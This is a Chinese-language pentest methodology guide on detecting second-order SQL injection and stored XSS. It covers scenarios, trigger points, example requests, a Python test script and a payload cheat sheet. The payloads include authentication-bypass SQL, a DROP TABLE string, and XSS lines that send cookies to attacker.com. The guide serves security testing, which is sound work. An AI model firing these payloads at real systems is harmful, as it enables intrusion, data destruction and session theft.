# 二阶注入检测方法论文档

---

# 第一部分：文档概述

## 1.1 编写目的
为渗透测试人员提供二阶注入（Second-Order Injection）漏洞的系统化检测方法，帮助识别和利用这种隐蔽性更强的注入漏洞。

## 1.2 适用范围
适用于 SQL 二阶注入、存储型 XSS、延迟命令执行等二阶注入场景。

## 1.3 读者对象
本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 专题：二阶注入检测

### 2.1 技术介绍

二阶注入是指攻击者将恶意 Payload 存储到数据库中，在后续的某个时刻被应用程序取出并执行，从而触发漏洞的攻击方式。

**与一阶注入的区别：**
| 特征 | 一阶注入 | 二阶注入 |
|-----|---------|---------|
| **触发时机** | 立即触发 | 延迟触发 |
| **Payload 存储** | 不存储 | 存储到数据库 |
| **检测难度** | 较易 | 较难 |
| **WAF 防护** | 可防护 | 难以防护 |

### 2.2 常见场景

#### 2.2.1 SQL 二阶注入场景

| 场景 | 描述 | 风险点 |
|-----|------|-------|
| **用户注册** | 用户名/邮箱存储后用于查询 | 注册时存储 Payload，登录后触发 |
| **修改资料** | 个人资料存储后用于更新 | 修改时存储，查看或更新时触发 |
| **意见反馈** | 反馈内容存储后用于显示或处理 | 存储后管理员查看时触发 |
| **订单系统** | 订单信息存储后用于查询 | 下单时存储，查询时触发 |
| **日志记录** | 用户操作记录到日志表 | 记录时存储，分析日志时触发 |

#### 2.2.2 存储型 XSS 场景

| 场景 | 描述 | 风险点 |
|-----|------|-------|
| **评论区** | 评论内容存储后显示 | 评论存储，其他用户查看时触发 |
| **论坛帖子** | 帖子内容存储后显示 | 发帖存储，浏览时触发 |
| **用户资料** | 个人签名存储后显示 | 资料存储，他人查看时触发 |
| **聊天记录** | 聊天消息存储后显示 | 消息存储，接收方查看时触发 |

### 2.3 检测方法

#### 2.3.1 输入点分析

**可存储输入点识别：**
```
# 用户注册功能
- 用户名
- 邮箱
- 手机号
- 密码（通常不会，但需确认）
- 个人简介

# 用户资料功能
- 昵称
- 签名
- 头像 URL
- 个人主页

# 内容发布功能
- 文章标题
- 文章内容
- 评论
- 回复

# 其他功能
- 订单备注
- 收货地址
- 发票抬头
- 搜索历史
```

#### 2.3.2 Payload 设计

**SQL 二阶注入 Payload：**

```
# 用户名注入（注册时存储）
username: admin' OR '1'='1' --
username: admin' AND (SELECT SLEEP(5)) --
username: admin' UNION SELECT 1,version(),3--

# 邮箱注入
email: test@test.com' OR '1'='1' --

# 搜索词注入（存储后用于查询）
search: ' OR '1'='1' --
```

**存储型 XSS Payload：**

```
# 基础 XSS
<script>alert(1)</script>

# 绕过过滤
<scr<script>ipt>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

# Cookie 窃取
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

#### 2.3.3 触发点分析

**SQL 二阶注入触发点：**

```
# 登录功能
- 登录时查询用户信息
- 密码重置时查询

# 个人信息功能
- 查看个人资料
- 编辑个人资料
- 修改密码

# 管理功能
- 用户列表查询
- 订单查询
- 日志查询
- 数据统计

# 搜索功能
- 搜索历史记录查询
- 热门搜索展示
```

**存储型 XSS 触发点：**

```
# 内容展示
- 文章详情页
- 评论列表页
- 用户资料页
- 论坛帖子页

# 管理后台
- 用户管理页
- 内容审核页
- 反馈查看页
```

#### 2.3.4 检测流程

**步骤 1：Payload 存储**
```
1. 在注册/修改/提交表单中注入 Payload
2. 确认 Payload 成功存储到数据库
3. 记录注入的位置和 Payload 内容
```

**步骤 2：触发测试**
```
1. 访问可能触发漏洞的功能点
2. 观察响应是否有异常
3. 使用不同账号测试（普通用户、管理员）
```

**步骤 3：结果确认**
```
1. SQL 注入：观察 SQL 错误、时间延迟、内容变化
2. XSS：观察是否执行 JavaScript、Cookie 是否被窃取
```

### 2.4 检测用例

#### 2.4.1 用户注册二阶注入

```
# 步骤 1：注册时注入
POST /register
username=admin' OR '1'='1' --&password=test123&email=test@test.com

# 步骤 2：使用注入的用户名登录
POST /login
username=admin' OR '1'='1' --&password=anything

# 步骤 3：观察是否绕过认证或出现 SQL 错误
```

#### 2.4.2 修改资料二阶注入

```
# 步骤 1：修改个人签名
POST /profile/update
signature=<script>alert(document.cookie)</script>

# 步骤 2：查看个人资料
GET /profile

# 步骤 3：观察是否执行 JavaScript
```

#### 2.4.3 订单备注二阶注入

```
# 步骤 1：下单时注入备注
POST /order/create
product_id=1&notes=' OR '1'='1' --

# 步骤 2：管理员查看订单
GET /admin/orders

# 步骤 3：观察是否出现 SQL 错误或异常
```

#### 2.4.4 搜索历史二阶注入

```
# 步骤 1：搜索时注入
GET /search?q=' UNION SELECT version()--

# 步骤 2：查看搜索历史
GET /search/history

# 步骤 3：观察是否在展示历史时触发注入
```

### 2.5 自动化检测

#### 2.5.1 Burp Suite 检测

```
# 使用 Burp Suite 检测二阶注入
1. 使用 Repeater 存储 Payload
2. 使用 Intruder 触发测试
3. 使用 Logger 追踪数据流
4. 使用 Retire.js 检测前端库漏洞
```

#### 2.5.2 自定义检测脚本

```python
import requests

def test_second_order_injection(base_url):
    # 步骤 1：注册时注入
    register_payload = "test' OR '1'='1' --"
    requests.post(f"{base_url}/register", data={
        "username": register_payload,
        "password": "test123",
        "email": "test@test.com"
    })
    
    # 步骤 2：登录触发
    response = requests.post(f"{base_url}/login", data={
        "username": register_payload,
        "password": "test123"
    })
    
    # 步骤 3：分析响应
    if "SQL syntax" in response.text or "welcome" in response.text:
        print("可能存在的二阶注入漏洞")
```

### 2.6 检测注意事项

1. **数据隔离**：测试数据应与生产数据隔离
2. **影响最小化**：避免使用破坏性 Payload
3. **完整记录**：记录注入点、触发点、利用过程
4. **清理测试数据**：测试完成后清理注入的数据
5. **多角色测试**：使用不同权限账号测试

---

# 第三部分：附录

## 3.1 二阶注入 Payload 速查表

| 类型 | Payload | 说明 |
|-----|---------|------|
| **SQL 注入** | `admin' OR '1'='1' --` | 认证绕过 |
| **SQL 注入** | `admin' AND SLEEP(5)--` | 时间盲注 |
| **SQL 注入** | `admin' UNION SELECT version()--` | 联合查询 |
| **SQL 注入** | `'; DROP TABLE users;--` | 破坏性（慎用） |
| **存储型 XSS** | `<script>alert(1)</script>` | 基础 XSS |
| **存储型 XSS** | `<img src=x onerror=alert(1)>` | 标签 XSS |
| **存储型 XSS** | `<svg onload=alert(1)>` | SVG XSS |
| **存储型 XSS** | `<script>fetch('http://attacker.com?c='+document.cookie)</script>` | Cookie 窃取 |

## 3.2 参考资源

- [OWASP Second Order SQL Injection](https://owasp.org/www-community/attacks/Second_Order_SQL_Injection)
- [PortSwigger - Second Order Attacks](https://portswigger.net/web-security/second-order-attacks)
- [PayloadsAllTheThings - Second Order Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Second%20Order%20Injection)
